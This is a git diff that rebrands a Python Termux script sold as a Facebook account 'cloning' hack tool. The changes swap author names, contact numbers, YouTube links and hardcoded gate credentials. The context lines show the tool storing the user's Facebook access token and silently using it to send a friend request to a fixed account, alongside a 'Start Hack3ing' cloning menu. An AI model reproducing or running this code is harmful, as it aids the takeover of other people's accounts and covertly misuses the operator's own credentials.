@@ -49,22 +49,22 @@ def jalan(z):
 #### LOGO ####
 logo = """
 
-\033[0;31m██████╗░░█████╗░██████╗\033[0;31m░
-\033[0;31m╚════██╗██╔══██╗╚════██\033[0;31m╗
-\033[0;31m░█████╔╝██║░░██║░░███╔═\033[0;31m╝
-\033[0;31m░╚═══██╗██║░░██║██╔══╝░\033[0;31m░
-\033[0;31m██████╔╝╚█████╔╝███████\033[0;31m╗
-\033[0;31m╚═════╝░░╚════╝░╚══════\033[0;31m╝
+\033[0;31m░█████╗░██╗░░██╗██╗░░██╗\033[0;31m░
+\033[0;31m██╔══██╗██║░░██║██║░██╔╝\033[0;31m╗
+\033[0;31m███████║███████║█████═╝░\033[0;31m╝
+\033[0;31m██╔══██║██╔══██║██╔═██╗░\033[0;31m░
+\033[0;31m██║░░██║██║░░██║██║░╚██╗\033[0;31m╗
+\033[0;31m╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝\033[0;31m╝
 \033[0;36m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|M.Asim  CH\033[0;31m║
-\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/asim102\033[0m \033[0;31m║
-\033[0;39m║\033[0;36m* \033[0;32mWhatsApp Group \033[1;32m: \033[1;32m/https://chat.whatsapp.com/F1SAi3LpBJlDT8NR4rK7ln\033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|Ijaz Afridi\033[0;31m║
+\033[0;39m║\033[1;33m* \033[1;33mWhatsapp \033[1;33m : \033[1;33m\033[4m+92389153973\033[0m \033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;32mYoutube\033[1;32m: \033[1;32m/https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw\033[0;31m║
 \033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[●] \x1b[1;93mSigning Ahk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -78,13 +78,13 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
-print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : 08694910155\x1b[1;96m  
+print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : +923489153973\x1b[1;96m  
 \033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : TERMUX TOOLS\x1b[1;96m  
-\033[1;93m [¤] \x1b[0;31mTOOLS BY Asim\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : Asim Pardasis\x1b[0;31m"""
+\033[1;93m [¤] \x1b[0;31mTOOLS BY Afridi\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : Mr Badmash\x1b[0;31m"""
 print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 
-CorrectUsername = "ch"
-CorrectPassword = "ch"
+CorrectUsername = "afridi"
+CorrectPassword = "afridi"
 
 loop = 'true'
 while (loop == 'true'):
@@ -96,10 +96,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "yang bener dong"
-            os.system('xdg-open https://wa.me/6285691015635')
+            os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
     else:
         print "salah sayang!"
-        os.system('xdg-open https://wa.me/6285691015635')
+        os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
 
 def login():
 	os.system('clear')
@@ -117,7 +117,7 @@ def login():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
+			print"\n\033[1;96m[!] \x1b[1;91mThere is no connection"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -140,7 +140,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/c/AsimPardasi')
+				os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -193,7 +193,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Asim"																														
+	print "\033[1;32;40m[2] \033[1;33;40m══Update Afridi"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -298,10 +298,10 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print "   \033[1;31;48m●💋════════════════════════◄►════════════════════════💋●"
+	print "   \033[1;31;48m●💋════════════════════════◄►══════════════════════💋●"
 
-	jalan('                    \033[1;91mAsim start cloning Wait...')
-	print  "  \033[1;36;48m ●💋════════════════════════◄►════════════════════════💋●" 
+	jalan('                    \033[1;91mAfridi start cloning Wait...')
+	print  "  \033[1;36;48m ●💋════════════════════════◄►══════════════════════💋●" 
 
 	def main(arg):
 		global cekpoint,oks
